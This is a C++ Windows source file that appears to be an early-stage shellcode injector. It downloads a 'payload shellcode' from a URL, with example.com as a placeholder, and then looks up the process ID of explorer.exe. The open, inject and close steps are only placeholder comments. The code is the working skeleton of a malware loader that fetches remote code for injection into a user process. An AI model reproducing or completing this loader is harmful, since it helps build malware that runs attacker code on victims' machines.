#pragma comment(lib, "urlmon.lib")
#include <urlmon.h>
#include <cstdio>
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
using namespace std;

// Given process name, return process ID
int walk(const char* processName) {
	wchar_t winProcName[260];
	size_t converted;

	mbstowcs_s(&converted, winProcName, processName, strlen(processName));
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == snapshot) {
		printf("Bad handle\n");
		return -1;
	}
	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(snapshot, &proc)) {
		CloseHandle(snapshot);
		printf("Bad process");
		return -1;
	}
	while (Process32Next(snapshot, &proc)) {
		if (wcscmp(proc.szExeFile, winProcName) == 0) {
			printf("Found matching process");
			int pid = proc.th32ProcessID;
			CloseHandle(snapshot);
			return pid;
		}
	}
	printf("DIDN'T find matching process :(");
	return 0;
}

string download(const char* payloadUrl) {
	IStream* stream;

	if (URLOpenBlockingStreamA(0, payloadUrl, &stream, 0, 0)) {
		return "Failed";
	}
	printf("Connected to %s successfully\n", payloadUrl);

	char buff[100];
	string payload;
	unsigned long bytesRead;

	while (true) {
		stream->Read(buff, 100, &bytesRead);
		if (0U == bytesRead) {
			break;
		}
		payload.append(buff, bytesRead);
	};

	stream->Release();
	return payload;
}


int main(void) {

	// Download payload shellcode
	const char* payloadUrl = "https://example.com";
	string payload = download(payloadUrl);
	printf("payload data:\n%s\n", payload.c_str());

	// Find explorer.exe process
	int procID = walk("explorer.exe");
	printf("PID: %d\n", procID);

	// Open process

	// Inject payload

	// Close
	return 1;
}
